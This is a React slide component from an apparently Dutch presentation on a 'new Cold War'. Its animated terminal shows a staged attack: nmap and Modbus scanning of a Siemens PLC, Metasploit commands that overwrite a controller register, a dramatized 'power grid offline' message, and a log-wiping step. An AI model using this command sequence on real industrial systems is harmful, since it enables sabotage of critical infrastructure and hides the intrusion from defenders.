import Slide from '../components/Slide';
import Terminal from '../components/Terminal';

const terminalLines = [
  { type: 'command', prompt: 'root@kali:~# ', text: 'ls -la /var/log/nginx', color: 'text-green-400', delay: 1000, typingSpeed: 50 },
  { type: 'output', text: 'total 12\ndrwxr-xr-x  2 root root 4096 May 16 23:00 .\ndrwxr-xr-x 10 root root 4096 May 16 23:00 ..\n-rw-r--r--  1 root root    0 May 16 23:00 access.log\n-rw-r--r--  1 root root    0 May 16 23:00 error.log', color: 'text-slate-300', delay: 400 },
  { type: 'command', prompt: 'root@kali:~# ', text: 'whoami', color: 'text-green-400', delay: 1200, typingSpeed: 60 },
  { type: 'output', text: 'root', color: 'text-slate-300', delay: 200 },
  { type: 'command', prompt: 'root@kali:~# ', text: 'ip a | grep "inet " | grep -v 127.0.0.1', color: 'text-green-400', delay: 1500, typingSpeed: 45 },
  { type: 'output', text: '    inet 192.168.50.5/24 brd 192.168.50.255 scope global eth0', color: 'text-slate-300', delay: 300 },
  { type: 'command', prompt: 'root@kali:~# ', text: 'nmap -sn 192.168.50.0/24', color: 'text-green-400', delay: 2000, typingSpeed: 50 },
  { type: 'output', text: 'Starting Nmap 7.93 ( https://nmap.org ) at 2026-05-16 23:13 UTC', color: 'text-slate-300', delay: 400 },
  { type: 'output', text: 'Nmap scan report for 192.168.50.1', color: 'text-slate-300', delay: 100 },
  { type: 'output', text: 'Nmap scan report for 192.168.50.12', color: 'text-slate-300', delay: 100 },
  { type: 'output', text: 'Nmap scan report for 192.168.50.44', color: 'text-slate-300', delay: 100 },
  { type: 'output', text: 'Nmap done: 256 IP addresses (3 hosts up) scanned in 2.14 seconds', color: 'text-slate-300', delay: 200 },
  { type: 'command', prompt: 'root@kali:~# ', text: 'nmap -sV -p 502 --script=modbus-discover 192.168.50.12', color: 'text-green-400', delay: 1800, typingSpeed: 40 },
  { type: 'output', text: 'Starting Nmap 7.93 ( https://nmap.org ) at 2026-05-16 23:14 UTC', color: 'text-slate-300', delay: 400 },
  { type: 'output', text: 'Nmap scan report for scada-grid-controller.local (192.168.50.12)', color: 'text-slate-300', delay: 100 },
  { type: 'output', text: 'PORT    STATE SERVICE  VERSION', color: 'text-green-300', delay: 400 },
  { type: 'output', text: '502/tcp open  modbus   Modbus TCP', color: 'text-red-400 font-bold', delay: 600 },
  { type: 'output', text: '| modbus-discover:', color: 'text-slate-400', delay: 50 },
  { type: 'output', text: '|   Device ID: 01', color: 'text-slate-400', delay: 50 },
  { type: 'output', text: '|   Vendor: Siemens', color: 'text-slate-400', delay: 50 },
  { type: 'output', text: '|_  Model: SIMATIC S7-1200', color: 'text-slate-400', delay: 200 },
  { type: 'command', prompt: 'root@kali:~# ', text: 'msfconsole -q', color: 'text-green-400', delay: 2500, typingSpeed: 60 },
  { type: 'output', text: '[*] Starting the Metasploit Framework console...', color: 'text-blue-400', delay: 800 },
  { type: 'output', text: '[*] Database connection established', color: 'text-blue-400', delay: 400 },
  { type: 'command', prompt: 'msf6 > ', text: 'search modbus type:auxiliary', color: 'text-yellow-200', delay: 2200, typingSpeed: 45 },
  { type: 'output', text: 'Matching Modules', color: 'text-slate-300 font-bold underline', delay: 400 },
  { type: 'output', text: '   #  Name                                      Disclosure Date  Rank    Check  Description', color: 'text-slate-400', delay: 50 },
  { type: 'output', text: '   -  ----                                      ---------------  ----    -----  -----------', color: 'text-slate-400', delay: 50 },
  { type: 'output', text: '   0  auxiliary/scanner/scada/modbusclient                       normal  No     Modbus Client Utility', color: 'text-slate-300', delay: 50 },
  { type: 'output', text: '   1  auxiliary/scanner/scada/modbus_findunitid                  normal  No     Modbus Unit ID Scanner', color: 'text-slate-300', delay: 50 },
  { type: 'command', prompt: 'msf6 > ', text: 'use 0', color: 'text-yellow-200', delay: 1800, typingSpeed: 60 },
  { type: 'command', prompt: 'msf6 auxiliary(scanner/scada/modbusclient) > ', text: 'show options', color: 'text-yellow-200', delay: 1500, typingSpeed: 40 },
  { type: 'output', text: 'Module options (auxiliary/scanner/scada/modbusclient):', color: 'text-slate-300 font-bold', delay: 400 },
  { type: 'output', text: '   Name           Current Setting  Required  Description', color: 'text-slate-400', delay: 50 },
  { type: 'output', text: '   ----           ---------------  --------  -----------', color: 'text-slate-400', delay: 50 },
  { type: 'output', text: '   DATA_ADDRESS   0                yes       The starting address for the data', color: 'text-slate-300', delay: 50 },
  { type: 'output', text: '   RHOSTS                          yes       The target host(s)', color: 'text-slate-300', delay: 50 },
  { type: 'command', prompt: 'msf6 auxiliary(scanner/scada/modbusclient) > ', text: 'set RHOSTS 192.168.50.12', color: 'text-yellow-200', delay: 1600, typingSpeed: 35 },
  { type: 'output', text: 'RHOSTS => 192.168.50.12', color: 'text-slate-300', delay: 100 },
  { type: 'command', prompt: 'msf6 auxiliary(scanner/scada/modbusclient) > ', text: 'set DATA_ADDRESS 40001', color: 'text-yellow-200', delay: 1200, typingSpeed: 40 },
  { type: 'output', text: 'DATA_ADDRESS => 40001', color: 'text-slate-300', delay: 100 },
  { type: 'command', prompt: 'msf6 auxiliary(scanner/scada/modbusclient) > ', text: 'run', color: 'text-yellow-200', delay: 1500, typingSpeed: 50 },
  { type: 'output', text: '[*] 192.168.50.12:502 - Sending MODBUS READ HOLDING REGISTERS...', color: 'text-blue-400', delay: 600 },
  { type: 'output', text: '[+] 192.168.50.12:502 - Modbus Unit ID: 1, Register 40001: 0x00FF', color: 'text-green-400 font-bold', delay: 800 },
  { type: 'command', prompt: 'msf6 auxiliary(scanner/scada/modbusclient) > ', text: 'set ACTION WRITE_REGISTER', color: 'text-yellow-200', delay: 1800, typingSpeed: 35 },
  { type: 'output', text: 'ACTION => WRITE_REGISTER', color: 'text-slate-300', delay: 100 },
  { type: 'command', prompt: 'msf6 auxiliary(scanner/scada/modbusclient) > ', text: 'set DATA 0x0000', color: 'text-yellow-200', delay: 1200, typingSpeed: 45 },
  { type: 'output', text: 'DATA => 0x0000', color: 'text-slate-300', delay: 100 },
  { type: 'command', prompt: 'msf6 auxiliary(scanner/scada/modbusclient) > ', text: 'run', color: 'text-red-400 font-bold', delay: 2000, typingSpeed: 60 },
  { type: 'output', text: '[*] 192.168.50.12:502 - Sending MODBUS WRITE REGISTER...', color: 'text-blue-400', delay: 600 },
  { type: 'output', text: '[!] 192.168.50.12:502 - WARNING: Register 40001 value modified!', color: 'text-yellow-400 font-bold', delay: 400 },
  { type: 'output', text: '[+] 192.168.50.12:502 - POWER GRID SECTOR 4 OFFLINE', color: 'text-red-500 font-black animate-pulse', delay: 1000 },
  { type: 'command', prompt: 'msf6 auxiliary(scanner/scada/modbusclient) > ', text: 'exit', color: 'text-slate-400', delay: 3000, typingSpeed: 50 },
  { type: 'command', prompt: 'root@kali:~# ', text: './wipe_logs.sh && exit', color: 'text-slate-400', delay: 2500, typingSpeed: 40 },
  { type: 'output', text: 'Cleaning system logs...', color: 'text-slate-400', delay: 400 },
  { type: 'output', text: 'Removing bash history...', color: 'text-slate-400', delay: 300 },
  { type: 'output', text: 'Connection closed by foreign host.', color: 'text-slate-400', delay: 1000 },
];

export default function Slide28() {
  return (
    <Slide className=" text-white">
      <div className="flex h-full">
        <div className="w-1/2 flex flex-col justify-center pr-12 border-r border-slate-800">
          <h2 className="text-6xl font-black mb-8 uppercase tracking-tighter">Een Nieuwe Koude Oorlog?</h2>
          <ul className="space-y-6 text-2xl text-slate-300">
            <li className="flex items-start">
               <span className="text-red-600 mr-4 font-black">&gt;</span>
               <p><span className="text-white font-bold">Parallellen met toen:</span> NAVO vs. Rusland.</p>
            </li>
            <li className="flex items-start">
               <span className="text-red-600 mr-4 font-black">&gt;</span>
               <p><span className="text-white font-bold">Wapenwedloop:</span> In de ruimte en in de digitale wereld.</p>
            </li>
            <li className="flex items-start">
               <span className="text-red-600 mr-4 font-black">&gt;</span>
               <p><span className="text-white font-bold">Cyberoorlog:</span> Desinformatie en sabotage.</p>
            </li>
            <li className="flex items-start">
               <span className="text-red-600 mr-4 font-black">&gt;</span>
               <p><span className="text-white font-bold">Proxy-conflict:</span> De oorlog in Oekraïne.</p>
            </li>
          </ul>
        </div>
        <div className="w-1/2 flex flex-col justify-center pl-12 items-center">
           <Terminal terminalLines={terminalLines} />
        </div>
      </div>
    </Slide>
  );
}
